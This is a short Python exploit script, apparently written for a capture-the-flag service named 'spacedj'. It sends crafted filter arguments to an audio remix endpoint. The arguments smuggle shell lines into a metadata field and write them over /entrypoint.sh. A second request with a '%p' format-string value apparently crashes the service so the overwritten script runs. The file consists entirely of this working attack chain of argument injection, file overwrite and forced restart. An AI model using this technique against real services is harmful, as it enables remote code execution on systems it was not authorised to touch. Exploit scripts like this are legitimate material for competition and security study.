#!/usr/bin/python3


from checklib import BaseChecker
import requests
import sys
from base64 import b64encode

sys.path.append("../../")
sys.path.append("../checker/")

from spacedj.checker.service_client import ServiceClient


payload = ["echo PWNED", "cd /app && python3.12 main.py"]

ow_cf = [
            f"1,ametadata=add:key=fyec:value='a; \n{'\n'.join(payload)}',ametadata=print:file=/entrypoint.sh",
            "0",
            "0",
            "0",
            "0",
            "1",
]

crash_cf = ["%p", "1", "0", "0", "0", "0"]


def main():
    client = ServiceClient(
        checker=BaseChecker("127.0.0.1"), port=3322, session=requests.Session()
    )

    with open("sample.mp3", "rb") as f:
        uuid = client.make_remix(
            f,
            "sample.mp3",
            {
                "author": "author",
                "preset": "CUSTOM",
                "process_cf": ow_cf,
            },
        )

    with open("sample.mp3", "rb") as f:
        uuid = client.make_remix(
            f,
            "sample.mp3",
            {
                "author": "author",
                "preset": "CUSTOM",
                "process_cf": crash_cf,
            },
        )


if __name__ == "__main__":
    main()